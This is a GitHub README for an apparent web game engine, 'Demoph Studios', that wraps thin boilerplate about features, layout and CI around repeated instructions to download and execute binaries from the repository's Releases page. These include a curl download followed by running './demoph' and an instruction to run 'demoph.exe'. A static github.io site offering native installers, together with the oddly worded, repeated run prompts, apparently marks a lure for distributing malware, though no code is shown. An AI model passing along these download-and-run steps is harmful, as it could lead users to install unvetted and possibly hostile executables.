# Demoph Studios Web Engine — Tools, Games, Team, Website, Toolset

[![Releases](https://img.shields.io/badge/Releases-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/wahbi18/demophstudios.github.io/releases)

![Web engine banner](https://images.unsplash.com/photo-1498050108023-c5249f4df085?auto=format&fit=crop&w=1600&q=60)

2025 (C) Demoph Studios.  
Topics: demoph-engine, demoph-studios, demoph-team, demophgames, demophstudios, tools, toolset, web-application, webapp, website

This repository hosts the Demoph Studios web engine and demo site. It bundles a compact toolset for building small web games, UI components, and deployment pipelines. Use the releases page to get production-ready builds.

Download and execute the release file from the Releases page:  
https://github.com/wahbi18/demophstudios.github.io/releases

Quick links
- Releases (download and run): [https://github.com/wahbi18/demophstudios.github.io/releases](https://github.com/wahbi18/demophstudios.github.io/releases)
- GitHub Pages demo: (see Releases for packaged demo)

What this repo contains
- A small static site powered by the Demoph Engine.  
- A CLI for build and deploy tasks.  
- Reusable UI components for games and apps.  
- Sample game assets and HTML5 demos.  
- CI config and deployment scripts.

Why use this
- The toolset fits small teams and solo creators.  
- The engine uses standard web tech: HTML, CSS, JavaScript.  
- The build and deploy flow works with GitHub Pages and simple servers.  
- Components follow common patterns. You can adapt them to your project.

Badges
[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE) [![Topics](https://img.shields.io/badge/topics-demoph--engine%20demoph--studios-lightgrey?style=flat-square)](https://github.com/wahbi18/demophstudios.github.io)

Features
- Core engine: scene manager, asset loader, input layer.  
- UI widget kit: buttons, dialogs, HUD components.  
- Build system: one-command build for dev and prod.  
- Asset pipeline: image packing, audio optimization, sprite sheet tools.  
- CLI tools: scaffold, build, serve, deploy.  
- Small demos: platformer, card game, UI showcase.

Demo screenshots
![Demo: platformer](https://raw.githubusercontent.com/github/explore/main/topics/javascript/javascript.png)
![Demo: UI kit](https://raw.githubusercontent.com/github/explore/main/topics/html/html.png)

Quickstart (local)
1. Clone this repo.
   git clone https://github.com/wahbi18/demophstudios.github.io.git
2. Change into the project.
   cd demophstudios.github.io
3. Install dependencies (node/npm required).
   npm install
4. Start dev server.
   npm run dev
5. Open http://localhost:3000

Release install (download & run)
The Releases page hosts packaged builds and installers. The page has a path (/releases), so download the release file for your platform and run it.

Typical flow:
- Visit the Releases page: https://github.com/wahbi18/demophstudios.github.io/releases  
- Download the archive or installer that matches your OS.  
- Extract the archive and run the launcher or the included install script.

Example commands (replace <tag> and <file> with values from the release):
- macOS / Linux (tar):
  curl -L -o demoph-release.tar.gz "https://github.com/wahbi18/demophstudios.github.io/releases/download/<tag>/<file>.tar.gz"
  tar -xzf demoph-release.tar.gz
  cd demoph-release
  ./demoph
- Windows (zip):
  Download the ZIP from the Releases page.
  Extract and run demoph.exe

If the release link fails or picks the wrong file, check the Releases section on GitHub for assets and versioned binaries.

Commands reference
- npm run dev — start dev server with live reload.  
- npm run build — produce optimized production bundle.  
- npm run serve — serve built site locally.  
- npm run test — run unit tests.  
- npx demoph scaffold <name> — generate a new demo or component.

Project layout
- /src — source code for engine and demo apps.  
  - /engine — core engine modules.  
  - /ui — widget kit.  
  - /demos — sample games and pages.  
- /assets — images, audio, and raw assets.  
- /build — generated output.  
- /tools — CLI, build helpers, packers.  
- /docs — developer docs and API reference.

Engine notes (developer)
- Scene manager uses an entity list and tick loop. The loop runs at requestAnimationFrame.  
- Asset loader supports prefetch and lazy load. Use asset tags to group assets by scene.  
- Input system unifies pointer and keyboard events. Map actions in a small config file.  
- Rendering uses the DOM and canvas where appropriate. The small renderer prioritizes clarity and compatibility.

Build pipeline
- Uses rollup or esbuild depending on the demo.  
- Bundles code into a compact main.js.  
- Produces sprite sheets and minified assets for production.  
- Generates a static index.html per demo with preloaded critical assets.

Testing
- Unit tests use a light test harness with jest.  
- Run npm run test to validate core modules.  
- CI runs tests and builds assets on pull requests.

Contribute
- Fork the repo.  
- Create a branch for your feature or fix.  
- Add tests and docs when relevant.  
- Open a pull request that explains the change. Keep PRs small and focused.

Guidelines
- Keep modules small. Aim for single responsibility.  
- Document public functions with jsdoc comments.  
- Use semantic versioning for releases. Tag releases with vMAJOR.MINOR.PATCH.  
- Keep asset sizes tight for web targets.

Code style
- Follow modern JavaScript. Use const and let.  
- Prefer small functions and clear names.  
- Run lint and format before commits.  
- Use the CLI hooks provided in tools to run checks.

Security and privacy
- Keep secrets out of the repo. Use environment variables for CI.  
- Use secure defaults for deploy scripts.

Testing assets
- The demos include test assets for image and audio. Replace them when you add real content.  
- Use the asset pipeline to pack sprites into sheets to lower HTTP requests.

Roadmap
- 2025 Q3: Add networked demo and simple matchmaker.  
- 2025 Q4: Add editor UI for scene layout.  
- 2026: Add plugin system for community components.

Changelog
- See Releases for versioned changelogs and packaged files. You will find release notes with each tag on the Releases page.

License
2025 (C) Demoph Studios. Licensed under MIT. See LICENSE file.

Contact
- Repo: https://github.com/wahbi18/demophstudios.github.io  
- Issues: open an issue on GitHub for bugs or feature requests.  
- PRs: send a pull request with tests where possible.

Credits
- Engine design by Demoph Team.  
- Assets: a mix of public domain and contributor files. See /assets for attributions.

Automation and CI
- The repo includes GitHub Actions for build and deploy. Actions run tests and create release artifacts. The release step packages binaries and uploads them to the Releases page.

Search engine optimization (SEO) hints for pages
- Use clear titles and meta descriptions.  
- Add structured data for demos and releases.  
- Serve compressed assets and set cache headers for static files.

Topics and tags
This project uses these tags to help search and discovery:
demoph-engine, demoph-studios, demoph-team, demophgames, demophstudios, tools, toolset, web-application, webapp, website

More on Releases
Access the releases page for stable builds and installers. The release page includes zip/tar packages and signed assets. Download the asset that matches your platform and run the included launcher or installer from the extracted folder.

Releases: https://github.com/wahbi18/demophstudios.github.io/releases

License file and contributor agreement reside in the repo. Check them before you publish derived builds.